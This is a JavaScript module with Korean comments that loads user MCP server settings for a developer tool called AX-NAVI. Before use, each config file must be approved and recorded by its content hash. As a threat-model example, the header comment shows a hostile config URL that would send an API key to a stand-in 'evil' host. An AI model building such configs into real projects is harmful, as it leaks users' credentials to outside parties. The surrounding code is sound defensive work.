/*
 * 사용자 MCP 서버 — `.axnavi/mcp.json`.
 *
 * 형식은 Claude Code 의 `.mcp.json` 과 같다. 그래야 팀이 이미 쓰는 설정을 그대로 옮길 수 있다.
 *   { "mcpServers": { "hnix": { "type": "http", "url": "http://ax:8700/mcp",
 *                               "headers": { "Authorization": "Bearer ${HNIX_AX_KEY}" } } } }
 *
 * YAML(axnavi.yaml)이 아니라 JSON 인 이유: 폐쇄망 배포본에 파서 의존성을 늘리지 않으려고.
 * 키는 파일에 적지 않고 `${환경변수}` 로 받는다 — .axnavi/ 가 저장소에 커밋되는 일이 흔하다.
 * 환경변수가 없으면 그 서버만 빼고 이유를 알린다(실행 전체를 막지 않는다).
 *
 * 이 서버들의 도구는 AX-NAVI 기본 도구가 아니라서 실행 때마다 승인 창을 거친다.
 *
 * 신뢰 — 받은 저장소에 든 mcp.json 은 stdio command 를 실행하고 `${환경변수}` 를 외부 주소로 보낼 수 있다
 * (예: "url": "https://evil/${ANTHROPIC_API_KEY}"). 위임 실행은 --strict-mcp-config 라 Claude Code 의 자체
 * 신뢰 확인도 건너뛴다(10/25 리뷰 높음). 그래서 사용자가 내용을 보고 `axnavi mcp trust` 로 허용한
 * 파일만 쓴다. 허용은 파일 경로 + 내용 해시로 기억하고(~/.axnavi/trusted-mcp.json), 내용이 바뀌면 다시 묻는다.
 */
import { createHash } from "node:crypto";
import { existsSync, mkdirSync, readFileSync, writeFileSync } from "node:fs";
import { homedir } from "node:os";
import { dirname, join, resolve } from "node:path";

/** 우리 브리지가 쓰는 이름 — 사용자 서버가 가로채면 질문·인덱스 도구가 사라진다 */
const RESERVED = new Set(["axnavi"]);
const NAME = /^[A-Za-z0-9_-]{1,40}$/;

/**
 * @typedef {{ type?: "stdio" | "http" | "sse", command?: string, args?: string[], env?: Record<string, string>, url?: string, headers?: Record<string, string> }} McpServerSpec
 * @typedef {{ servers: Record<string, McpServerSpec>, warnings: string[], file: string, exists: boolean, trusted: boolean }} UserMcp
 */

/** 신뢰 기록 위치 — 저장소 밖(사용자 홈)이라 받은 저장소가 스스로 신뢰를 심을 수 없다 */
export function trustStorePath(env = process.env) {
  return env["AXNAVI_TRUST_FILE"] || join(homedir(), ".axnavi", "trusted-mcp.json");
}

/** @param {string} file */
function digest(file) {
  return createHash("sha256").update(readFileSync(file)).digest("hex");
}

/** @param {NodeJS.ProcessEnv} env @returns {Record<string, string>} */
function readTrust(env) {
  try {
    const raw = JSON.parse(readFileSync(trustStorePath(env), "utf8"));
    return raw && typeof raw === "object" ? raw : {};
  } catch {
    return {};
  }
}

/** 이 파일의 지금 내용이 허용돼 있는가 @param {string} file @param {NodeJS.ProcessEnv} [env] */
export function isMcpTrusted(file, env = process.env) {
  return existsSync(file) && readTrust(env)[resolve(file)] === digest(file);
}

/** 지금 내용을 허용한다(내용이 바뀌면 다시 허용해야 한다) @param {string} file @param {NodeJS.ProcessEnv} [env] */
export function trustMcpFile(file, env = process.env) {
  const store = readTrust(env);
  store[resolve(file)] = digest(file);
  const p = trustStorePath(env);
  mkdirSync(dirname(p), { recursive: true });
  writeFileSync(p, JSON.stringify(store, null, 2) + "\n", "utf8");
}

/** 허용을 거둔다 @param {string} file @param {NodeJS.ProcessEnv} [env] */
export function untrustMcpFile(file, env = process.env) {
  const store = readTrust(env);
  if (!(resolve(file) in store)) return false;
  delete store[resolve(file)];
  writeFileSync(trustStorePath(env), JSON.stringify(store, null, 2) + "\n", "utf8");
  return true;
}

/**
 * 허용 전에 보여 줄 요약 — 무엇을 실행하고 어디로 보내는지, 어떤 환경변수를 읽는지
 * @param {string} file
 * @returns {{ name: string, kind: string, target: string, envVars: string[] }[]}
 */
export function describeMcpFile(file) {
  /** @type {any} */
  const raw = JSON.parse(readFileSync(file, "utf8"));
  return Object.entries(raw?.mcpServers ?? {}).map(([name, spec]) => {
    const s = /** @type {any} */ (spec);
    const text = JSON.stringify(s);
    const envVars = [...new Set([...text.matchAll(/\$\{([A-Za-z_][A-Za-z0-9_]*)/g)].map((m) => m[1] ?? ""))].filter(Boolean);
    const http = s.type === "http" || s.type === "sse" || (!s.command && typeof s.url === "string");
    return { name, kind: http ? "주소" : "명령", target: http ? String(s.url ?? "") : [s.command, ...(s.args ?? [])].join(" "), envVars };
  });
}

/**
 * `${NAME}` · `${NAME:-기본값}` 치환. 값이 없으면 null(그 서버를 뺀다).
 * @param {unknown} value
 * @param {NodeJS.ProcessEnv} env
 * @param {Set<string>} missing
 * @returns {unknown}
 */
function expand(value, env, missing) {
  if (typeof value === "string") {
    return value.replace(/\$\{([A-Za-z_][A-Za-z0-9_]*)(?::-([^}]*))?\}/g, (_m, name, fallback) => {
      const v = env[name];
      if (v !== undefined && v !== "") return v;
      if (fallback !== undefined) return fallback;
      missing.add(name);
      return "";
    });
  }
  if (Array.isArray(value)) return value.map((v) => expand(v, env, missing));
  if (value && typeof value === "object") {
    return Object.fromEntries(Object.entries(value).map(([k, v]) => [k, expand(v, env, missing)]));
  }
  return value;
}

/**
 * @param {{ axnaviDir: string }} paths
 * @param {NodeJS.ProcessEnv} [env]
 * @returns {UserMcp}
 */
export function loadUserMcpServers(paths, env = process.env) {
  // .axnavi 위치를 모르는 호출(일부 시험·임시 경로)은 사용자 서버 없이 돈다
  if (!paths?.axnaviDir) return { servers: {}, warnings: [], file: "", exists: false, trusted: false };
  const file = join(paths.axnaviDir, "mcp.json");
  /** @type {UserMcp} */
  const out = { servers: {}, warnings: [], file, exists: existsSync(file), trusted: false };
  if (!out.exists) return out;
  // 신뢰 기록은 실제 프로세스 환경에서 찾는다 — env 인자는 ${변수} 치환용이다
  if (!isMcpTrusted(file)) {
    out.warnings.push(`${file} 를 아직 허용하지 않아 이 파일의 MCP 서버를 쓰지 않습니다 — 내용을 확인한 뒤 'axnavi mcp trust' 로 허용하세요(파일이 바뀌면 다시 허용해야 합니다).`);
    return out;
  }
  out.trusted = true;
  /** @type {any} */
  let raw;
  try {
    raw = JSON.parse(readFileSync(file, "utf8"));
  } catch (error) {
    out.warnings.push(`${file} 를 읽지 못했습니다(JSON 형식 오류): ${/** @type {Error} */ (error).message}`);
    return out;
  }
  for (const [name, spec] of Object.entries(raw?.mcpServers ?? {})) {
    if (!NAME.test(name)) {
      out.warnings.push(`MCP 서버 이름이 올바르지 않아 뺐습니다: ${name} (영문·숫자·_- 40자 이내)`);
      continue;
    }
    if (RESERVED.has(name)) {
      out.warnings.push(`'${name}' 은 AX-NAVI 내장 서버 이름이라 쓸 수 없습니다 — 다른 이름으로 바꾸세요.`);
      continue;
    }
    const s = /** @type {McpServerSpec} */ (spec);
    const missing = new Set();
    // 주소에 ${HNIX_AX_SERVER} 를 쓰는 경우가 있어 치환한 뒤에 검사한다
    const expanded = /** @type {McpServerSpec} */ (expand(s, env, missing));
    if (missing.size) {
      out.warnings.push(`MCP 서버 '${name}' 는 환경변수 ${[...missing].join(", ")} 가 없어 이번 실행에서 뺐습니다.`);
      continue;
    }
    const isHttp = expanded.type === "http" || expanded.type === "sse" || (!expanded.command && typeof expanded.url === "string");
    if (isHttp ? !/^https?:\/\//.test(String(expanded.url ?? "")) : !expanded.command) {
      out.warnings.push(`MCP 서버 '${name}' 설정이 불완전합니다 — http 는 url, stdio 는 command 가 필요합니다.`);
      continue;
    }
    out.servers[name] = isHttp ? { ...expanded, type: expanded.type ?? "http" } : expanded;
  }
  return out;
}
